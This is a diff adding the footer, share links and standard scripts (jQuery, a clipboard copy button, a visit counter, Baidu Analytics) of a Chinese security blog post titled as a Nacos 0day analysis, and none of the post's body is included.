+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&t=nacos-0day分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2024
+        N1ght
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?adec00eac37a4f07fb02d0f478140978";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
